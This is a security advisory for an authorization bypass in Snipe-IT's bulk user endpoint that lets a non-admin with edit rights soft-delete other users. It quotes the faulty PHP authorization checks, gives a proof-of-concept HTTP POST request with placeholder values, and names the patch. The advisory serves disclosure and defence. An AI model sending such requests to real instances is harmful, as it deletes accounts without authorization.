# [H] Snipe-IT has an authorization bypass on bulk editing users

## Summary
Severity: High
Advisory: GHSA-vgx7-c78r-69w9
CVE: CVE-2026-55460
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-vgx7-c78r-69w9
Type: github-advisory

## Affected
- Packagist: `snipe/snipe-it` — affected >=0 <8.6.2

## Details
### Impact
An authenticated non-admin user with `users.view` and `users.edit`, but without `users.delete`, can directly POST to `/users/bulksave` and soft-delete another non-admin user. The UI and confirmation route require `users.delete`, but the destructive sink only authorizes `update`.

### Attacker Model

Authenticated non-admin user with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ json
{"users.view":"1","users.edit":"1"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The attacker does not have `users.delete`, `admin`, or `superuser`.

### Affected Component

-   `routes/web/users.php`

-   `app/Http/Controllers/Users/BulkUsersController.php`

-   Endpoint: `POST /users/bulksave`

### Root Cause

The UI only exposes bulk delete to users with `delete` permission:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php
@can('delete', \App\Models\User::class)
    <option value="delete">...</option>
    <option value="merge">...</option>
@endcan
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The confirmation path also checks `delete`:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php
} elseif ($request->input('bulk_actions') == 'delete') {
    $this->authorize('delete', User::class);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

However, the destructive route is registered separately:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php
Route::post('bulksave', [Users\BulkUsersController::class, 'destroy'])
    ->name('users/bulksave');
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

and `destroy()` authorizes only `update`:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php
public function destroy(Request $request)
{
    $this->authorize('update', User::class);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When `delete_user=1` is present, the method reaches:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ php
$user->delete();
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### Proof of Concept

1.  Create a non-admin attacker account with `users.view` and `users.edit`, but not `users.delete`.

2.  Create a harmless non-admin target user.

3.  Log in as the attacker and obtain a valid CSRF token.

4.  Send:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ http
POST /users/bulksave HTTP/1.1
Host: <snipe-it-host>
Cookie: snipeit_session=<attacker-session>
Content-Type: application/x-www-form-urlencoded

_token=<csrf-token>
ids[]=<target-user-id>
delete_user=1
status_id=<valid-status-id>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Observed response:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ http
HTTP/1.1 302 Found
Location: http://<snipe-it-host>/users
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


### Patches
Patched in 374f426f0c

## References
- https://github.com/grokability/snipe-it/security/advisories/GHSA-vgx7-c78r-69w9
- https://nvd.nist.gov/vuln/detail/CVE-2026-55460
- https://github.com/grokability/snipe-it/commit/374f426f0c6bb7a4f129f7b85051cc1da753a0f5
- https://github.com/grokability/snipe-it
- https://github.com/grokability/snipe-it/releases/tag/v8.6.2
